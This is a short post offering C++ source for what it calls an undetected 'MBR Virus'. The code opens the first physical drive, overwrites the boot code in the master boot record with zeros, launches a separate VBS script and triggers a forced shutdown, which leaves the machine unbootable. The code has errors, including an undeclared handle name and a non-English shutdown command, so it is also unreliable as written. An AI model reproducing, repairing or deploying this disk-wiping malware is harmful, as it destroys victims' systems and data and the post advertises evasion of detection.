# MBR Virus with CPUKiller Undetected Virus
 #MBR Virus is undetected with this version! VBS will defend him and makes undetected the real threat MBR.
 #include <Windows.h>
#include <iostream>
#include<stdio.h>

int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
{
DWORD wb;
char mbr[512];
char oldMbr[512];
ZeroMemory(&mbr, sizeof(mbr));
ZeroMemory(&oldMbr, sizeof(oldMbr));
HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
ReadFile(drive, oldMbr, 512, &wb, NULL);
ZeroMemory(oldMbr, 440);
memcpy(mbr, oldMbr, 512);
SetFilePointer(drive, 0,0, FILE_BEGIN);
WriteFile(drive, mbr, 512, &wb, NULL);
CloseHandle(unidade);
system("bombalayan.vbs");
system("desligamento -s -t 00");
//Finish of code
